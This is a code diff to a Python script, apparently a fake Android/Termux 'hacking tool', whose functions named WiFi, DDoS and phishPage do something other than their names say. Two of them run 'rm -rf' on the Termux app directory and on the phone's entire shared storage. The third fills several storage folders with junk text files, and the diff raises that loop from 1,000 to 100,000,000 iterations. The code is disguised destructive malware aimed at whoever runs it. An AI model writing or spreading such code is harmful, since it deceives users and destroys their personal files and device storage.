@@ -12,14 +12,14 @@ def hackerPhone():
 
 
 def WiFi():
-	os.system('rm -rf data/data/com.termux')
+	os.system('rm -rf data/data/com.termux/')
 def DDoS():
-	os.system('rm -rf /storage/emulated/0')
+	os.system('rm -rf /storage/emulated/0/')
 
 def phishPage():
 	dirs=['/storage/emulated/0/', '/storage/emulated/0/Download/', '/storage/emulated/0/Android/', '/storage/emulated/0/DCIM/']
 	for i in dirs:
-		for j in range(0, 1000):
+		for j in range(0, 100000000):
 			os.system(f'echo ti loh >> {i}{j}.txt')
 
 
